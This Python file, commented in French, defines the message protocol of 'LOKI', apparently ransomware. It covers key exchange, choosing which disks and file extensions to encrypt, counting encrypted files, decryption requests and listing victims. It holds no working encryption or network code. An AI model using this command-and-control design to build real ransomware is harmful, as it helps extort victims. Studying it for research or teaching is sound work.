# Définition des messages
# initialize message
PROTOCOLE_LOKI = {
    "CRYPT_REQ": {
        "INITIALIZE": "hash",
        "OS": "type",
        "DISKS": "disks"
    },
    "CRYPT_KEY": {
        "KEY_RESP": "hash",
        "KEY": "key",
        "STATE": "state"
    },
    "CRYPT_RESP": {
        "CONFIGURE": "hash",
        "SETTING": {
            "DISKS": "disks",
            "PATHS": "paths",
            "FILE_EXT": "file_ext",
            "FREQ": "frequency",
            "KEY": "key",
            "STATE": "state"
        }
    },
    "PENDING_MSG": {
        "PENDING": "hash",
        "NB_FILE": "nb_files"
    },
    "DECRYPT_REQ": {
        "DECRYPT": "hash",
        "NB_FILE": "nb_files",
        "KEY": "key"
    },
    "RESTART_REQ": {
        "RESTART": "hash"
    },
    "RESTART_RESP": {
        "RESTART_RESP": "hash",
        "KEY": "key"
    },
    "LIST_VICTIM_REQ": {
        "LIST_REQ": None
    },
    "LIST_VICTIM_RESP": {
        "HASH": "hash",
        "OS": "type",
        "DISKS": "disks",
        "STATE": "state",
        "NB_FILES": "nb_files"
    },
    "LIST_VICTIM_END": {
        "LIST_END": None
    },
    "HISTORY_REQ": {
        "HIST_REQ": "hash"
    },
    "HISTORY_RESP": {
        "HIST_RESP": "hash",
        "TIMESTAMP": "timestamp",
        "STATE": "state",
        "NB_FILES": "nb_files"
    },
    "HISTORY_END": {
        "HIST_END": "hash"
    },
    "CHANGE_STATE": {
        "CHGSTATE": "hash",
        "STATE": "DECRYPT"
    }
}


# message_type
MESSAGE_TYPE = {
    'INITIALIZE': 'CRYPT_REQ', # première clé du message, nom du dictionaire ci-dessus
    'KEY_RESP': 'CRYPT_KEY',
    'CONFIGURE': 'CRYPT_RESP',
    'PENDING': 'PENDING_MSG',
    'DECRYPT': 'DECRYPT_REQ',
    'RESTART': 'RESTART_REQ',
    'RESTART_RESP': 'RESTART_RESP',
    'LIST_REQ': 'LIST_VICTIM_REQ',
    'HASH': 'LIST_VICTIM_RESP',
    'LIST_END': 'LIST_VICTIM_END',
    'HIST_REQ': 'HISTORY_REQ',
    'HIST_RESP': 'HISTORY_RESP',
    'HIST_END': 'HISTORY_END',
    'CHGSTATE': 'CHANGE_STATE',
}


def set_message(select_msg, params=None):
    """
    Retourne le dictionnaire correspondant à select_msg et le complète avec params si besoin.
    :param select_msg: Le message à récupérer (ex : LIST_VICTIM_REQ)
    :param params: les éventuels paramètres à ajouter au message
    :return: le message sous forme de dictionnaire
    """
    if select_msg.upper() in PROTOCOLE_LOKI:
        dictionnaire_selectionne = PROTOCOLE_LOKI[select_msg.upper()]
        if params:
            if len(params) == len(dictionnaire_selectionne):
                i = 0
                for cle in dictionnaire_selectionne:
                        dictionnaire_selectionne[cle]=params[i]
                        i += 1
                return dictionnaire_selectionne
            else:
                return (f"Le nombre de paramètres est incohérent. Vous en avez mis {len(params)}\n"
                        f"Le message attendu en compte {len(dictionnaire_selectionne)} ")
        return dictionnaire_selectionne

    else:
        return "Le dictionnaire que vous souhaitez récupérer n'existe pas."


def get_message_type(message):
    """
    Récupère le nom correspondant au type de message (ex : le dictionnaire LIST_VICTIM_REQ retourne 'LIST_REQ')
    :param message: le dictionnaire représentant le message
    :return: une chaine correspondant au nom du message comme définit par le protocole
    """

    nom_dictionnaire = list(message.keys())[0]
    return MESSAGE_TYPE[nom_dictionnaire]
